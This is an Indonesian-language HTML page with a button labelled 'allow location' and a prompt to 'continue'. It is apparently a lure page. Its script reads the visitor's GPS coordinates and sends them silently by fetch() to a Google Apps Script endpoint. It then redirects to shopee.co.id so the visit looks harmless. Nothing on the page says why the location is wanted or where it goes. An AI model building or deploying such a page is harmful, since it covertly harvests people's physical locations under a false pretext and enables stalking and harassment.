<!DOCTYPE html>
<html>
<head>
  <title>Aktifkan Lokasi</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <style>
    body {
      margin: 0;
      font-family: Arial;
      background: linear-gradient(135deg, #4facfe, #00f2fe);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      color: white;
      text-align: center;
    }

    .box {
      background: rgba(255,255,255,0.2);
      padding: 25px;
      border-radius: 15px;
    }

    button {
      margin-top: 15px;
      padding: 12px 20px;
      border: none;
      border-radius: 10px;
      background: white;
      color: #333;
      font-weight: bold;
      cursor: pointer;
    }
  </style>
</head>

<body>

<div class="box">
  <h2>Aktifkan Lokasi</h2>
  <p>Klik tombol di bawah untuk melanjutkan</p>
  <button onclick="ambilLokasi()">Izinkan Lokasi</button>
  <p id="status"></p>
</div>

<script>
function ambilLokasi(){

  if (navigator.geolocation) {

    navigator.geolocation.getCurrentPosition(
      function(pos){

        var lat = pos.coords.latitude;
        var lon = pos.coords.longitude;

        var url = "https://script.google.com/macros/s/AKfycbw2q8jMhiz3W0FRQ0_C-8hCA3WVAxAqmjeQ3snUsI0j6AMlYYNT_RrPTfjjFxxa48Yv/exec?lat=" 
                  + lat + "&lon=" + lon;

        fetch(url);

        document.getElementById("status").innerHTML = "✅ Lokasi berhasil diambil";

        // redirect otomatis
        setTimeout(()=>{
          window.location.href = "https://shopee.co.id";
        },2000);

      },

      function(error){
        document.getElementById("status").innerHTML = "❌ Harap izinkan lokasi agar lanjut";
      }

    );

  } else {
    document.getElementById("status").innerHTML = "❌ Browser tidak support";
  }
}
</script>

</body>
</html>
